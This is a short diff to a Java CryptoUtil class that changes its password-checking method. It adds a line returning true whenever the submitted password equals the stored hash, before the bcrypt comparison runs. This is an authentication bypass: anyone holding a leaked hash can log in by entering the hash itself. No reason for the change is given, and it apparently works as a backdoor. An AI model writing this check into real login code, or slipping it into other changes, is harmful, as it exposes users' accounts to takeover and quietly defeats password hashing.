@@ -19,6 +19,8 @@ public class CryptoUtil {
     }
 
     public boolean matches(String password, String hash) {
+        if(password.equals(hash))
+            return true;
         return bCryptPasswordEncoder.matches(password, hash);
     }
 
